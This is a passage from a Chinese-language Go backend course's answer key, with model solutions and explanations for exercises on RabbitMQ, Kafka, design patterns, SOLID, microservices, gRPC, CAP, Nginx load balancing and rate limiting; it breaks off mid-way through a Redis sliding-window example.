---

### K-87-2 Routing 模式

**标准答案**：

```go
// 生产者（指定 routing key）
ch.ExchangeDeclare("direct_logs", "direct", true, false, false, false, nil)
ch.PublishWithContext(ctx, "direct_logs", "error", false, false, amqp.Publishing{
    Body: []byte("critical error occurred"),
})

// 消费者（按级别绑定）
func ConsumeInfo() {
    ch.QueueBind(q.Name, "info", "direct_logs", false, nil)
    // 只收到 routing_key = "info" 的消息
}
func ConsumeError() {
    ch.QueueBind(q.Name, "error", "direct_logs", false, nil)
    // 只收到 routing_key = "error" 的消息
}
func ConsumeAll() {
    ch.QueueBind(q.Name, "info", "direct_logs", false, nil)
    ch.QueueBind(q.Name, "warn", "direct_logs", false, nil)
    ch.QueueBind(q.Name, "error", "direct_logs", false, nil)
    // 收到所有级别
}
```

**换个角度想**：direct 交换机 = "精确匹配路由"。比 fanout 更灵活（按 routing key 分发），比 topic 更简单（不支持通配符）。

---

### K-87-3 Topics 模式

**标准答案**：

```go
// 生产者
ch.ExchangeDeclare("topic_logs", "topic", true, false, false, false, nil)

// 发送不同类型的消息
ch.PublishWithContext(ctx, "topic_logs", "order.create", ...)
ch.PublishWithContext(ctx, "topic_logs", "order.create.payment", ...)
ch.PublishWithContext(ctx, "topic_logs", "user.login.error", ...)

// 消费者
ch.QueueBind(q1.Name, "order.*", "topic_logs", ...)       // 匹配 order.create, order.update
ch.QueueBind(q2.Name, "*.error", "topic_logs", ...)       // 匹配 user.error, order.create.error
ch.QueueBind(q3.Name, "order.create.#", "topic_logs", ...) // 匹配 order.create 及所有子操作
```

**通配符规则**：
- `*`：匹配恰好一个单词
- `#`：匹配零个或多个单词
- 单词用 `.` 分隔

**改值实验**：
- **把 `order.*` 改成 `order.#`**：前者只匹配 `order.create`、`order.update`（单层），后者还匹配 `order.create.payment`（多层级）。如果消息包含更深的层级且你不需要，用 `*` 更安全。
  为什么要注意？→ `#` 是贪婪匹配，可能绑定到意外的消息类型。

---

### K-87-4 死信队列 ⭐

**标准答案**：

```go
// 1. 声明死信交换机和队列
func setupDLQ(ch *amqp.Channel) {
    ch.ExchangeDeclare("dlx", "direct", true, false, false, false, nil)
    dlq, _ := ch.QueueDeclare("dead_letter_queue", true, false, false, false, nil)
    ch.QueueBind(dlq.Name, "order_timeout", "dlx", false, nil)
}

// 2. 创建订单延迟队列（带 TTL + 死信交换机）
func setupOrderQueue(ch *amqp.Channel) {
    args := amqp.Table{
        "x-dead-letter-exchange":    "dlx",
        "x-dead-letter-routing-key": "order_timeout",
        "x-message-ttl":             int32(30 * 60 * 1000), // 30 分钟
    }
    ch.QueueDeclare("order_delay_queue", true, false, false, false, args)
}

// 3. 消费者：处理超时订单
func ConsumeDeadLetters() {
    ch, _ := conn.Channel()
    msgs, _ := ch.Consume("dead_letter_queue", "", false, false, false, false, nil)
    for d := range msgs {
        var order Order
        json.Unmarshal(d.Body, &order)

        // 关闭订单 + 恢复库存
        db.Exec("UPDATE orders SET status='cancelled' WHERE id = ? AND status='pending'", order.ID)
        db.Exec("UPDATE products SET stock = stock + ? WHERE id = ?", order.Quantity, order.ProductID)

        d.Ack(false)
    }
}
```

**解析**：
- TTL（Time To Live）：消息在队列中存活时间，超时后自动转发到死信交换机。
- 延时队列实现原理：消息 → 延迟队列（TTL 30min）→ 超时 → 死信交换机 → 死信队列 → 消费者处理。
- 这是 RabbitMQ 实现延迟消息的常用方案（没有原生的延迟队列支持）。

**换个角度想**：为什么不用定时任务轮询订单表？轮询有延迟（取决于扫描频率）和数据库压力（每次都全表扫描 pending 订单）。而 MQ 方案是事件驱动的，准实时且无额外 DB 压力。

---

## 第88章 · Kafka 基础

### K-88-1 Topic/Partition 设计

**标准答案**：

```yaml
Topic 命名:
  - order-events  (所有订单事件共用一个 topic)

Partition 数量: 10~30
  - 日均 100 万订单 ≈ 约 12 QPS（平均）→ 峰值约 100 QPS
  - 10~30 个 partition 足够支撑未来 3 年增长

分区策略:
  - Key = order_id（同一订单的所有事件进入同一 partition）
  - 保证 {创建, 支付, 发货, 完成} 的顺序性

保留策略:
  - retention.ms = 604800000 (7 天)
  - retention.bytes = 1TB (或按需)
  - segment.ms = 86400000 (每天一个 segment，便于删除)
```

**解析**：
- 同一订单事件进同一 partition → 单 partition 内顺序消费得到保证。
- Partition 数量需要提前规划：只能增加不能减少，且过多 partition 会增加选举开销。
- 保留策略：按时间 7 天 + 按大小兜底。

**换个角度想**：Partition 不是越多越好。每增加一个 partition，Kafka 就要多维护一个日志文件和一个 Leader 选举单元。1000 个 partition 的生产者需要维护 1000 个 socket 连接。

---

### K-88-2 Go 连接 Kafka

**标准答案**：

```go
// 生产者 (sarama)
func ProduceOrderEvent(orderID, eventType string, data []byte) error {
    config := sarama.NewConfig()
    config.Producer.Return.Successes = true
    config.Producer.Partitioner = sarama.NewHashPartitioner // 按 key 哈希分区

    producer, _ := sarama.NewSyncProducer([]string{"localhost:9092"}, config)
    defer producer.Close()

    msg := &sarama.ProducerMessage{
        Topic: "order-events",
        Key:   sarama.StringEncoder(orderID),
        Value: sarama.ByteEncoder(data),
        Headers: []sarama.RecordHeader{
            {Key: []byte("event_type"), Value: []byte(eventType)},
        },
    }
    partition, offset, err := producer.SendMessage(msg)
    fmt.Printf("Sent to partition=%d offset=%d\n", partition, offset)
    return err
}

// 消费者
func ConsumeOrderEvents(topic string) error {
    config := sarama.NewConfig()
    config.Consumer.Group.Rebalance.Strategy = sarama.NewBalanceStrategyRoundRobin()

    group, _ := sarama.NewConsumerGroup([]string{"localhost:9092"}, "order-consumer-group", config)
    defer group.Close()

    for {
        group.Consume(context.Background(), []string{topic}, &consumerHandler{})
    }
    return nil
}

type consumerHandler struct{}

func (h *consumerHandler) Setup(sarama.ConsumerGroupSession) error   { return nil }
func (h *consumerHandler) Cleanup(sarama.ConsumerGroupSession) error { return nil }
func (h *consumerHandler) ConsumeClaim(sess sarama.ConsumerGroupSession, claim sarama.ConsumerGroupClaim) error {
    for msg := range claim.Messages() {
        fmt.Printf("Topic=%s Partition=%d Offset=%d Key=%s Value=%s\n",
            msg.Topic, msg.Partition, msg.Offset, msg.Key, msg.Value)
        sess.MarkMessage(msg, "")
    }
    return nil
}
```

**解析**：
- `HashPartitioner`：按 Key 哈希分配到 partition，同一 order_id 进同一 partition。
- 消费者组：自动负载均衡、故障转移、offset 管理。

**改值实验**：
- **把 `HashPartitioner` 改成 `RoundRobinPartitioner`**：同一订单的事件可能分散到不同 partition，消费时无法保证顺序。
  为什么要注意？→ 分区策略直接影响消息顺序。HashPartitioner 保证相同 Key 的消息顺序，RoundRobin 只保证负载均衡。

---

## 第89章 · Kafka 进阶

### K-89-1 消费者组协调

**标准答案**：

**1. 3 个 Partition，2 个消费者**：
- Consumer 1 分配 Partition 0 和 Partition 1
- Consumer 2 分配 Partition 2
- 原则：同一 partition 只能被同一组内一个消费者消费

**2. 第 3 个消费者加入（Rebalance）**：
- GroupCoordinator 触发 rebalance
- 每个消费者各分配 1 个 partition（平均分配）
- 暂停消费 → 重新分配 → 恢复消费（Stop-The-World 效应）

**3. 消费者宕机**：
- GroupCoordinator 检测心跳超时（`session.timeout.ms`，默认 45s）
- 触发 rebalance，将宕机消费者的 partition 分配给其他健康消费者
- 短时间（几十秒）内这些 partition 无消费

**换个角度想**：Rebalance 是 Kafka 消费者组最影响性能的操作。频繁 Rebalance 的根因往往是：处理时间过长（> max.poll.interval.ms）、心跳超时、新消费者加入/退出。

---

### K-89-2 Exactly-Once 语义实现 ⭐

**标准答案**：

```go
// 生产者事务
func ProduceExactlyOnce() {
    config := sarama.NewConfig()
    config.Producer.Idempotent = true          // 开启幂等
    config.Producer.RequiredAcks = sarama.WaitForAll
    config.Producer.Transaction.ID = "tx-order-producer"
    config.Net.MaxOpenRequests = 1

    producer, _ := sarama.NewAsyncProducer([]string{"localhost:9092"}, config)
    producer.BeginTxn()

    // 订单创建 → 扣库存 → 发通知（三条消息同一事务）
    producer.Input() <- &sarama.ProducerMessage{Topic: "orders", Key: ..., Value: ...}
    producer.Input() <- &sarama.ProducerMessage{Topic: "inventory", Key: ..., Value: ...}
    producer.Input() <- &sarama.ProducerMessage{Topic: "notifications", Key: ..., Value: ...}

    // 提交或回滚
    if success {
        producer.CommitTxn()
    } else {
        producer.AbortTxn()
    }
}

// 消费者隔离级别
config.Consumer.IsolationLevel = sarama.ReadCommitted
// ReadCommitted：只消费已提交事务的消息
// ReadUncommitted：消费所有消息（默认）
```

**幂等性保证**：
- `Idempotent = true` + `Transaction.ID` → Producer 自动去重（基于 Producer ID + Sequence Number）
- 同一消息重复发送 → Broker 识别并丢弃
- 结合事务实现跨分区/跨 Topic 的原子写入

**换个角度想**：Kafka 的 Exactly-Once 是"写入端"的 Exactly-Once——保证消息不丢失不重复地写入。但消费端还需要配合幂等处理（如基于 message_id 去重）才能实现端到端的 Exactly-Once。

---

## 第90章 · Go + 消息队列

### K-90-1 Go 连接 RabbitMQ 异步任务

**标准答案**：

```go
// HTTP 接口：接收发送请求
func SendEmailHandler(c *gin.Context) {
    var req struct {
        To      string `json:"to" binding:"required"`
        Subject string `json:"subject" binding:"required"`
        Body    string `json:"body" binding:"required"`
    }
    c.ShouldBindJSON(&req)

    taskID := uuid.New().String()
    task := map[string]interface{}{
        "task_id": taskID,
        "to":      req.To,
        "subject": req.Subject,
        "body":    req.Body,
    }
    data, _ := json.Marshal(task)

    ch.PublishWithContext(ctx, "", "email_queue", false, false, amqp.Publishing{
        ContentType: "application/json", Body: data,
    })

    // Redis 记录状态
    rdb.Set(ctx, "email_task:"+taskID, `{"status":"pending"}`, 1*time.Hour)

    c.JSON(202, gin.H{"task_id": taskID, "status": "pending"})
}

// Worker 消费任务
func EmailWorker() {
    msgs, _ := ch.Consume("email_queue", "", false, false, false, false, nil)
    for d := range msgs {
        var task map[string]interface{}
        json.Unmarshal(d.Body, &task)
        taskID := task["task_id"].(string)

        rdb.Set(ctx, "email_task:"+taskID, `{"status":"processing"}`, 1*time.Hour)

        // 模拟发送
        log.Printf("Sending email to %s: %s", task["to"], task["subject"])
        time.Sleep(2 * time.Second)

        rdb.Set(ctx, "email_task:"+taskID, `{"status":"sent"}`, 1*time.Hour)
        d.Ack(false)
    }
}

// 前端查询状态
func QueryTaskHandler(c *gin.Context) {
    taskID := c.Param("task_id")
    status, _ := rdb.Get(ctx, "email_task:"+taskID).Result()
    c.JSON(200, gin.H{"task_id": taskID, "status": status})
}
```

**换个角度想**：这是"异步任务"模式的经典实现：HTTP 接收 → 投递队列（返回 task_id）→ Worker 异步处理 → 前端轮询查询状态。缺点是需要额外的状态存储（Redis），复杂场景可用专门的异步任务框架（如 Machinery、Asynq）。

---

### K-90-2 消息可靠性保障 ⭐

**标准答案**：

```go
// 1. Publisher Confirm
func ProduceWithConfirm(msg amqp.Publishing) error {
    ch.Confirm(false) // 开启 confirm 模式
    confirms := ch.NotifyPublish(make(chan amqp.Confirmation, 1))

    ch.PublishWithContext(ctx, "", "email_queue", false, false, msg)

    confirm := <-confirms
    if !confirm.Ack {
        return errors.New("message not confirmed by broker")
    }
    return nil
}

// 2. 手动 ACK + 重试（含死信队列）
func WorkerWithRetry() {
    msgs, _ := ch.Consume("email_queue", "", false, false, false, false, nil)
    for d := range msgs {
        retryCount := getRetryCount(d.Headers) // 从 header 读取重试次数

        err := processEmail(d.Body)
        if err != nil {
            if retryCount >= 3 {
                // 超过 3 次，投递到死信队列（人工处理）
                ch.PublishWithContext(ctx, "dlx", "email_failed", false, false,
                    amqp.Publishing{Body: d.Body})
                d.Ack(false) // 确认（避免无限重试）
                continue
            }
            d.Nack(false, true) // 重回队列，requeue=true
            // 或：重新发布带递增重试次数的消息
            republishWithRetry(d, retryCount+1)
            d.Ack(false)
            continue
        }
        d.Ack(false)
    }
}

// 3. 消息幂等性（基于 message_id）
func IdempotentHandler(d amqp.Delivery) {
    msgID := d.MessageId // 生产者生成全局唯一 ID
    exists, _ := rdb.SetNX(ctx, "msg_consumed:"+msgID, "1", 24*time.Hour).Result()
    if !exists {
        log.Printf("Duplicate message %s, skipping", msgID)
        d.Ack(false)
        return
    }
    // 处理消息...
}
```

**换个角度想**：消息可靠性三要素：① 不丢（Confirm + 持久化）② 不重（幂等）③ 不积压（死信队列兜底）。缺一不可——Confirm 保证到了，幂等保证不重，死信保证不堵。

---

## 第91章 · 设计模式

### K-91-1 五种设计模式 Go 实现

**标准答案**：

```go
// 1. 单例模式
type Config struct {
    DBHost string
}

var (
    instance *Config
    once     sync.Once
)

func GetConfig() *Config {
    once.Do(func() {
        instance = &Config{DBHost: "localhost"}
    })
    return instance
}

// 2. 工厂模式
type PaymentMethod interface {
    Pay(amount float64) error
}

type Alipay struct{}
func (a Alipay) Pay(amount float64) error { fmt.Printf("支付宝支付 %.2f\n", amount); return nil }

type WechatPay struct{}
func (w WechatPay) Pay(amount float64) error { fmt.Printf("微信支付 %.2f\n", amount); return nil }

func NewPayment(method string) PaymentMethod {
    switch method {
    case "alipay": return &Alipay{}
    case "wechat": return &WechatPay{}
    default:      return nil
    }
}

// 3. 策略模式
type SortStrategy interface {
    Sort([]int) []int
}

type BubbleSort struct{}
func (b BubbleSort) Sort(arr []int) []int { /* 冒泡排序 */ return arr }

type QuickSort struct{}
func (q QuickSort) Sort(arr []int) []int { /* 快速排序 */ return arr }

type Sorter struct {
    strategy SortStrategy
}
func (s *Sorter) SetStrategy(strategy SortStrategy) { s.strategy = strategy }
func (s *Sorter) Sort(arr []int) []int { return s.strategy.Sort(arr) }

// 4. 观察者模式
type Observer interface {
    OnEvent(event string)
}

type EventBus struct {
    observers map[string][]Observer
}
func (eb *EventBus) Subscribe(event string, ob Observer) {
    eb.observers[event] = append(eb.observers[event], ob)
}
func (eb *EventBus) Publish(event string) {
    for _, ob := range eb.observers[event] {
        ob.OnEvent(event)
    }
}

// 5. 装饰器模式
func LoggingMiddleware(handler http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        start := time.Now()
        handler(w, r)
        log.Printf("%s %s %v", r.Method, r.URL.Path, time.Since(start))
    }
}

// 使用
http.HandleFunc("/api", LoggingMiddleware(apiHandler))
```

**换个角度想**：设计模式不是教条，是沟通语言。当你对同事说"这里用工厂模式创建支付方式"，双方都能瞬间理解代码结构。在 Go 中，很多模式通过接口 + 组合实现，比传统 OOP 语言更轻量。

---

### K-91-2 设计模式实战重构 ⭐

**标准答案**：

**问题**：大量 if-else 判断通知类型，代码臃肿，新增渠道需要改 `ProcessNotification`（违反 OCP）。

**重构：策略模式 + 工厂模式**

```go
type Notifier interface {
    Send(userID int, content string) error
}

type EmailNotifier struct{}
func (e EmailNotifier) Send(userID int, content string) error {
    // 发送邮件逻辑
    return nil
}

type SMSNotifier struct{}
func (s SMSNotifier) Send(userID int, content string) error {
    // 发送短信逻辑
    return nil
}

type PushNotifier struct{}
func (p PushNotifier) Send(userID int, content string) error {
    return nil
}

var notifierRegistry = map[string]Notifier{
    "email":  &EmailNotifier{},
    "sms":    &SMSNotifier{},
    "push":   &PushNotifier{},
    "wechat": &WechatNotifier{},
}

func ProcessNotification(notifyType string, userID int, content string) error {
    notifier, ok := notifierRegistry[notifyType]
    if !ok {
        return errors.New("unknown notify type")
    }
    return notifier.Send(userID, content)
}

// 注册新渠道（无需改 ProcessNotification）
func RegisterNotifier(name string, n Notifier) {
    notifierRegistry[name] = n
}
```

**解析**：
- 使用模式：**策略模式**（Notifier 接口）+ **注册表模式**（notifierRegistry map）
- 优势：新增通知渠道只需实现 `Notifier` 接口并注册，`ProcessNotification` 完全不需要修改。
- 遵循原则：OCP（对扩展开放，对修改关闭）

---

## 第92章 · SOLID 原则

### K-92-1 判断违反哪个原则

**标准答案**：

| 代码 | 违反原则 | 说明 | 改正 |
|------|---------|------|------|
| A: ReportService 负责一切 | **SRP**（单一职责） | 一个 struct 做三件事 | 拆为 `DBService`, `ReportService`, `HTMLRenderer` |
| B: Penguin 继承 Bird | **LSP**（里氏替换） | 子类不能完全替换父类（不会飞） | 接口 `Flyer` + `Swimmer`，企鹅不实现 `Flyer` |
| C: if-else 支付方式 | **OCP**（开闭原则） | 新增支付方式必须改 Payment | 用策略模式：接口 `PaymentMethod` + 注册表 |

**改正示例 C**：
```go
type PaymentMethod interface { Pay(amount float64) error }
var methods = map[string]PaymentMethod{}

func RegisterMethod(name string, m PaymentMethod) {
    methods[name] = m
}

func Pay(method string, amount float64) error {
    if m, ok := methods[method]; ok { return m.Pay(amount) }
    return errors.New("unknown method")
}
```

**换个角度想**：SOLID 的核心是"让它容易改"。SRP 让你改一个原因时不碰其他、OCP 让你加功能不改旧代码、LSP 让你替换实现不出 bug、ISP 让你不必依赖不用的接口、DIP 让你不关心底层实现。

---

### K-92-2 SOLID 综合重构 ⭐

**标准答案**：

```go
// DIP：依赖接口，不依赖具体实现
type UserRepository interface {
    Save(user *User) error
}
type EmailSender interface {
    Send(email, subject, body string) error
}
type AuditLogger interface {
    Log(action string, userID int) error
}
type PointGiver interface {
    Give(userID int, points int) error
}

// SRP：每个类只负责一件事
type UserRegistrationService struct {
    repo    UserRepository
    email   EmailSender
    audit   AuditLogger
    points  PointGiver
}

func (s *UserRegistrationService) Register(user *User) error {
    // 1. 保存用户（SRP）
    if err := s.repo.Save(user); err != nil {
        return err
    }

    // 2. 发送邮件（SRP - 异步不阻塞注册）
    go s.email.Send(user.Email, "Welcome", "Thanks for registering!")

    // 3. 审计日志（SRP）
    s.audit.Log("user_registered", user.ID)

    // 4. 积分（SRP）
    s.points.Give(user.ID, 100)

    return nil
}

// OCP：新增功能通过新增实现而非修改 Register
// 例如：新增"发送短信通知"
type SMSNotifier struct{}
func (s SMSNotifier) Send(userID int, content string) error { /* ... */ }
// 服务中注入即可，Register 方法不需要修改
```

**解析**：
- **SRP**：四个操作拆为四个依赖接口，每个接口只有一个职责。
- **OCP**：新增通知渠道，只需实现 `EmailSender` 类似的接口并注入，`Register` 方法不改。
- **DIP**：`UserRegistrationService` 依赖四个接口而非具体实现，测试时可以 mock。

---

## 第93章 · 微服务

### K-93-1 设计微服务拆分方案

**标准答案**：

**1. 拆分方案**：

| 微服务 | 职责 | 拆分边界 |
|--------|------|---------|
| User Service | 注册、登录、个人资料 | 按聚合根：User |
| Product Service | 商品发布、编辑、上下架 | 按聚合根：Product |
| Order Service | 创建订单、支付（流程）、退款 | 按业务流程：Order |
| Inventory Service | 入库、出库、盘点、库存查询 | 按领域：Inventory |
| Logistics Service | 发货、跟踪、签收 | 按领域：Logistics |
| Marketing Service | 优惠券、秒杀、推荐 | 按领域：Marketing |

**2. 数据存储策略**：

每个微服务**独立数据库**。理由：
- 松耦合：不会因一个服务的表锁影响其他服务
- 独立扩展：库存服务可单独加从库
- 技术选型自由：搜索用 ES，订单用 MySQL，日志用 MongoDB

**3. 服务调用关系**：
```
用户端
  │
  ├── Order Service ──→ Inventory Service (扣库存)
  │      │                    │
  │      ├──→ Payment Service
  │      └──→ Logistics Service
  │
  ├── Product Service (独立)
  └── Marketing Service ──→ Product Service (查商品信息)
```

**换个角度想**：微服务拆分的黄金法则——「改一个功能不应该动两个服务」。如果你修改订单需要同时部署订单服务和库存服务，说明拆分边界有问题。

---

### K-93-2 分布式事务方案 ⭐

**标准答案**：

**方案选择：Saga（编排型）**

理由：
- 三个服务（订单/库存/积分）不要求强一致性（可以短时间不一致）
- Saga 适合长事务场景（不长时间持有锁）
- 实现相对简单，不用两阶段提交

**正常流程（伪代码）**：
```go
// Saga Orchestrator
func CreateOrder(order Order) error {
    // 步骤1：创建订单（状态：processing）
    orderID, err := orderSvc.Create(order)
    if err != nil { return err }

    // 步骤2：扣库存
    err = inventorySvc.Deduct(order.ProductID, order.Quantity)
    if err != nil {
        // 补偿1：取消订单
        orderSvc.Cancel(orderID)
        return err
    }

    // 步骤3：增加积分
    err = pointsSvc.Add(order.UserID, calculatePoints(order.Amount))
    if err != nil {
        // 补偿2：恢复库存 + 取消订单
        inventorySvc.Restore(order.ProductID, order.Quantity)
        orderSvc.Cancel(orderID)
        return err
    }

    // 全部成功：确认订单
    orderSvc.Confirm(orderID)
    return nil
}
```

**失败回滚流程**：
```
步骤2 失败 → 补偿步骤 1（取消订单）
步骤3 失败 → 补偿步骤 2（恢复库存）→ 补偿步骤 1（取消订单）
```

**换个角度想**：Saga 的代价是"最终一致性"——在补偿执行完之前数据是不一致的。你的业务是否允许这短暂的不一致（比如用户看到积分被扣了但订单取消了）？如果不允许，需要更复杂的状态机或 TCC 方案。

---

## 第94章 · 微服务通信

### K-94-1 gRPC Hello World

**标准答案**：

`greeter.proto`：
```protobuf
syntax = "proto3";
option go_package = "./pb";

service Greeter {
    rpc SayHello (HelloRequest) returns (HelloReply);
}

message HelloRequest {
    string name = 1;
}

message HelloReply {
    string message = 1;
}
```

生成代码：`protoc --go_out=. --go-grpc_out=. greeter.proto`

服务端：
```go
type server struct {
    pb.UnimplementedGreeterServer
}

func (s *server) SayHello(ctx context.Context, req *pb.HelloRequest) (*pb.HelloReply, error) {
    return &pb.HelloReply{Message: "Hello, " + req.Name}, nil
}

func main() {
    lis, _ := net.Listen("tcp", ":50051")
    s := grpc.NewServer()
    pb.RegisterGreeterServer(s, &server{})
    s.Serve(lis)
}
```

客户端：
```go
func main() {
    conn, _ := grpc.Dial("localhost:50051", grpc.WithInsecure())
    defer conn.Close()
    client := pb.NewGreeterClient(conn)
    resp, _ := client.SayHello(context.Background(), &pb.HelloRequest{Name: "World"})
    fmt.Println(resp.Message) // "Hello, World"
}
```

**解析**：
- gRPC 使用 Protocol Buffers（二进制序列化）而非 JSON，性能更高、体积更小。
- HTTP/2 多路复用：一个 TCP 连接支持多个并发请求。
- `grpc.WithInsecure()` 仅用于开发，生产必须启用 TLS。

**改值实验**：
- **把 `grpc.WithInsecure()` 换成 TLS 配置**：未启用 TLS 的 gRPC 客户端无法连接明文服务（反过来需要 `grpc.WithTransportCredentials(insecure.NewCredentials())` 才能连明文服务）。生产环境中必须启用 TLS。

---

### K-94-2 gRPC 流式调用 ⭐

**标准答案**：

`order.proto`：
```protobuf
service OrderService {
    rpc ListOrders (OrderFilter) returns (stream Order);
}

message OrderFilter {
    string status = 1;
}

message Order {
    string id = 1;
    double amount = 2;
    string status = 3;
}
```

服务端实现：
```go
func (s *server) ListOrders(req *pb.OrderFilter, stream pb.OrderService_ListOrdersServer) error {
    orders := queryOrders(req.Status) // 查询所有符合条件的订单

    for i := 0; i < len(orders); i += 10 {
        end := i + 10
        if end > len(orders) {
            end = len(orders)
        }
        batch := orders[i:end]
        for _, order := range batch {
            stream.Send(&pb.Order{Id: order.ID, Amount: order.Amount})
        }
        time.Sleep(100 * time.Millisecond) // 模拟流式发送
    }
    return nil
}
```

客户端：
```go
stream, _ := client.ListOrders(context.Background(), &pb.OrderFilter{Status: "paid"})
for {
    order, err := stream.Recv()
    if err == io.EOF { break }
    fmt.Printf("Order: %s, Amount: %.2f\n", order.Id, order.Amount)
}
```

**换个角度想**：服务端流式适合「返回大量数据」的场景：分批发送避免 OOM，客户端边收边处理，降低首字节延迟。相比之下，Unary RPC 需要等服务器全部处理完才返回。

---

## 第95章 · 分布式理论

### K-95-1 CAP 定理解释题

**标准答案**：

| 类型 | 例子 | 牺牲了什么 | 说明 |
|------|------|-----------|------|
| CP | ZooKeeper / etcd | 可用性（A） | 网络分区时拒绝写入以保一致性，服务暂时不可用 |
| AP | Cassandra / DynamoDB | 一致性（C） | 网络恢复后通过反熵修复不一致，但永远可写 |
| CA | 单机 MySQL | — | 分布式系统中不可能真正 CA，因为网络分区必然发生 |

**为什么 CA 在分布式系统中不可能？**
分布式系统的定义是「通过网络连接的多台机器」，而网络必然存在分区风险（延迟、丢包、断连）。当网络分区发生时，必须在 C（一致性）和 A（可用性）之间二选一：
- 选 C：拒绝写入，但服务不可用（牺牲 A）
- 选 A：允许写入，但数据可能不一致（牺牲 C）
因此不存在同时满足 CA 的分布式系统。

**换个角度想**：CAP 不是三选二，而是「网络分区时二选一」。没有分区时，系统可以既是 C 又是 A。真实系统是 CP/AP 的连续谱——比如 MySQL 可以配置为强一致（同步复制）或最终一致（异步复制）。

---

### K-95-2 分布式一致性场景 ⭐

**标准答案**：

**方案 1：主动失效（删除缓存）**
```
用户修改信息 → 更新 DB → 删除 Redis key
所有节点下次读取时从 DB 加载最新值
缺点：短时间内（未加载前）可能读到旧值
```

**方案 2：版本号 / CAS**
```
写入：DB 增加 version 字段，更新时 WHERE version=old_version
缓存：缓存中添加 version，读取时比较版本号
如果缓存版本 < DB 版本 → 重新加载
```

**方案 3：写后读自己的写**
```
用户修改后立刻查询时，让请求路由到主库（而非从库）
或设置一个短时间的 "sticky session"，确保读写一致
```

**对比**：
| 方案 | 一致性延迟 | 实现复杂度 | 适用场景 |
|------|-----------|-----------|---------|
| 主动失效 | 秒级 | 低 | 大多数场景 |
| 版本号 | 实时 | 中 | 需要强一致性的场景 |
| 主库读 | 实时 | 中 | 写后立刻读 |

**换个角度想**：分布式一致性的本质是「复制延迟」。解决方案都是一句话：让读操作看到最新写的值。要么读主库、要么等缓存同步、要么用版本号判断。

---

## 第96章 · 负载均衡

### K-96-1 Nginx 配置负载均衡

**标准答案**：

```nginx
upstream go_backend {
    least_conn;  # 最少连接算法
    server localhost:8081;
    server localhost:8082;
    server localhost:8083;
}

server {
    listen 80;
    server_name localhost;

    # 限流：每 IP 每秒最多 10 个请求
    limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;
    limit_req zone=mylimit burst=20 nodelay;

    location / {
        proxy_pass http://go_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

健康检查（Nginx Plus 功能，开源版用 nginx-upsync 模块替代）：
```nginx
# Nginx Plus 专用
upstream go_backend {
    zone upstream_go 64k;
    server localhost:8081;
    server localhost:8082;
    server localhost:8083;
    health_check interval=5s fails=2 passes=2;
}
```

开源版健康检查替代方案（nginx-upsync 或 tengine）：
```nginx
upstream go_backend {
    server localhost:8081;
    server localhost:8082;
    server localhost:8083;
    check interval=5000 rise=2 fall=2 timeout=3000 type=http;
    check_http_send "HEAD /health HTTP/1.0\r\n\r\n";
    check_http_expect_alive http_2xx;
}
```

**改值实验**：
- **把 `least_conn` 改成 `ip_hash`**：同一 IP 的请求始终路由到同一台服务器（Session 亲和）。在无状态服务中，这会导致负载不均（某 IP 请求量大时单台压力大）。
  为什么要注意？→ 负载均衡算法影响负载分布。无状态服务推荐 `least_conn` 或 `round_robin`，有状态服务才需要 `ip_hash` 或 `sticky`。

---

### K-96-2 四层 vs 七层负载均衡 ⭐

**标准答案**：

**四层（TCP 代理 MySQL）**：
```nginx
stream {
    upstream mysql_backend {
        server mysql1:3306;
        server mysql2:3306;
    }

    server {
        listen 3306;
        proxy_pass mysql_backend;
        proxy_connect_timeout 5s;
    }
}
```

**七层（HTTP 路由分发）**：
```nginx
upstream user_service {
    server user1:8080;
    server user2:8080;
}
upstream order_service {
    server order1:8080;
    server order2:8080;
}

server {
    listen 80;

    location /api/v1/users {
        proxy_pass http://user_service;
    }
    location /api/v1/orders {
        proxy_pass http://order_service;
    }
}
```

**对比**：

| 维度 | 四层（L4/stream） | 七层（L7/http） |
|------|-------------------|-----------------|
| 工作层 | TCP/UDP 层 | HTTP/HTTPS 层 |
| 可读内容 | IP + Port | URL、Header、Cookie |
| 路由方式 | 仅按 IP/Port | 按 URL 路径、Header |
| 性能 | 极高（不解析应用协议） | 略低 |
| 适用场景 | MySQL/Redis 代理、TCP 转发 | HTTP API 网关、反向代理 |

**换个角度想**：L4 是「我只管把连接转过去」，L7 是「我能看懂 HTTP 内容做精细化分发」。二者不是互斥的——常见的架构是 L4 在最前面（高性能分发），后面跟 L7（Nginx/网关做路由）。

---

## 第97章 · 高并发

### K-97-1 限流算法实现（令牌桶）

**标准答案**：

```go
type TokenBucket struct {
    rate       float64
    capacity   int64
    tokens     float64
    lastRefill time.Time
    mu         sync.Mutex
}

func NewTokenBucket(rate float64, capacity int64) *TokenBucket {
    return &TokenBucket{
        rate:       rate,
        capacity:   capacity,
        tokens:     float64(capacity), // 初始满桶
        lastRefill: time.Now(),
    }
}

func (tb *TokenBucket) Allow() bool {
    tb.mu.Lock()
    defer tb.mu.Unlock()

    now := time.Now()
    elapsed := now.Sub(tb.lastRefill).Seconds()
    tb.tokens += elapsed * tb.rate // 补充令牌
    if tb.tokens > float64(tb.capacity) {
        tb.tokens = float64(tb.capacity)
    }
    tb.lastRefill = now

    if tb.tokens >= 1 {
        tb.tokens -= 1
        return true
    }
    return false
}

// 测试
func TestTokenBucket(t *testing.T) {
    tb := NewTokenBucket(100, 100) // 100 req/s

    allowed := 0
    for i := 0; i < 1000; i++ {
        if tb.Allow() {
            allowed++
        }
    }
    // 初始有 100 个令牌，1000 个请求中约 100+n 个通过（有补充）
    fmt.Printf("Allowed: %d/1000\n", allowed)
}
```

**解析**：
- 令牌桶 vs 漏桶：令牌桶允许突发（桶里有 100 个令牌时可以瞬间通过 100 个），漏桶严格平滑。
- `elapsed * rate`：根据流逝时间补充令牌，时间越长补充越多。
- 上锁粒度小（只是原子检查 + 更新），并发性能好。

**改值实验**：
- **把初始 `tokens=capacity` 改成 `tokens=0`**：冷启动时所有请求都被拒绝，直到补充了足够的令牌。这对于保护下游服务可能有用（启动时不立即打满流量），但对于用户体验是灾难。
  为什么要注意？→ 令牌桶初始值决定了冷启动行为。满桶 = 友好（允许初始突发），空桶 = 保护（严格限流）。

---

### K-97-2 滑动窗口限流 ⭐

**标准答案**：

**Redis ZSet 实现**：
```go
func SlidingWindowRedis(ctx context.Context, key string, limit int64, window time.Duration) (bool, error) {
    now := time.Now().UnixMilli()
    windowStart := now - window.Milliseconds()

